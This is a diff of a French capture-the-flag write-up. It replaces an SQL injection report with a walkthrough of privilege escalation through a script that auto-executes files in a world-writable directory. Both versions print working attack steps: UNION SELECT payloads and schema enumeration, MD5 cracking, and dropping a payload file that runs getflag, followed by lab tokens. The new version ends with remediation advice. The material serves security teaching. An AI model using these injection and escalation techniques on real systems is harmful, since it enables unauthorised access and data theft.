@@ -1,46 +1,79 @@
-# Rapport de Vulnérabilité : Injection SQL (list\_images)
-
-## Nom de la Faille
-
-Injection SQL
-
-## OWASP
-**A03:2021 – Injection**
+# Rapport de Vulnérabilité : Exécution automatique de scripts via un répertoire surveillé
 
 ## Description
 
-Cette faille est similaire à l'injection SQL sur 'Members ID'. Elle permet également d'exécuter des requêtes SQL arbitraires via un formulaire, en accédant à des informations sensibles dans la base de données. La table ciblée est `list_images`, et l'exploitation suit le même processus que précédemment.
+Dans ce niveau, un script shell présent dans `/usr/sbin/openarenaserver` exécute automatiquement tout fichier placé dans un dossier spécifique (`/opt/openarenaserver/`). Il ne vérifie pas l’identité de l’utilisateur à l’origine du fichier, ce qui permet d’injecter un script malveillant qui sera exécuté avec les privilèges de l’utilisateur `flag05`. Cette faille permet donc de détourner le mécanisme d’exécution automatique pour obtenir le flag.
 
-## Commandes Utilisées
+## Comment Exploiter la Faille
 
-```
-1 UNION ALL SELECT 1, DATABASE()
+### Étape 1 : Rechercher les fichiers appartenant à `flag05`
 
-1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
-
-1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
-
-1 AND 1=2 UNION SELECT {column_name}, null FROM list_images
+```bash
+find / -user flag05 2>/dev/null
 ```
 
-## Traitement des données extraites
-
-Dans la colonne `comment`, nous obtenons un code MD5 qu'il faut :
-
-1. Déchiffrer en MD5.
-2. Mettre en minuscule.
-3. Encrypter en SHA-256.
-
-### Exemple de traitement
-
-- Code MD5 extrait : 1928e8083cf461a51303633093573c46
-- Décodage MD5 : `albatroz`
-- Encodage SHA-256 :
+**Résultat :**
 
 ```
-f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
 ```
+
+### Étape 2 : Analyse du script trouvé
+
+```bash
+cat /usr/sbin/openarenaserver
+```
+
+**Contenu :**
+
+```bash
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+Ce script exécute tout fichier présent dans `/opt/openarenaserver/` avec `bash`, puis supprime le fichier après exécution.
+
+### Étape 3 : Injection d’un script malveillant
+
+On crée un fichier qui contient une commande pour récupérer le flag :
+
+```bash
+echo "getflag > /tmp/token" > /opt/openarenaserver/playload
+```
+
+Lorsque le script `openarenaserver` est déclenché, il exécute le fichier `playload`, ce qui redirige la sortie de `getflag` vers `/tmp/token`.
+
+### Étape 4 : Lecture du flag
+
+Une fois le script exécuté automatiquement :
+
+```bash
+cat /tmp/token
+```
+
+**Flag obtenu :**
+
+```
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
+
+---
+
+## Comment Résoudre la Faille
+
+Pour corriger cette vulnérabilité :
+
+* **Vérifier l’identité de l’utilisateur avant d’exécuter un fichier** : S’assurer que seuls les fichiers écrits par un utilisateur autorisé soient exécutés.
+* **Restreindre l’accès au répertoire surveillé** : Limiter les permissions en écriture de `/opt/openarenaserver/` pour empêcher l’injection de scripts par des utilisateurs non autorisés.
+* **Utiliser des mécanismes d'exécution sécurisés** : Éviter d’exécuter des scripts directement avec `bash` sur du contenu externe non vérifié.
 
 ## Conclusion
 
-Cette injection SQL est similaire à celle de 'Members ID', exploitant des failles d'entrée utilisateur non sécurisées. En appliquant les mêmes mesures correctives, vous réduisez considérablement le risque de compromission des données.
+Cette faille démontre les risques liés à l’exécution automatique de fichiers dans un répertoire public. Sans vérification de l’origine ni des permissions, un simple fichier déposé peut permettre une élévation de privilèges. La sécurisation des répertoires exécutés dynamiquement est essentielle pour éviter ce type d’attaque.
+
+---
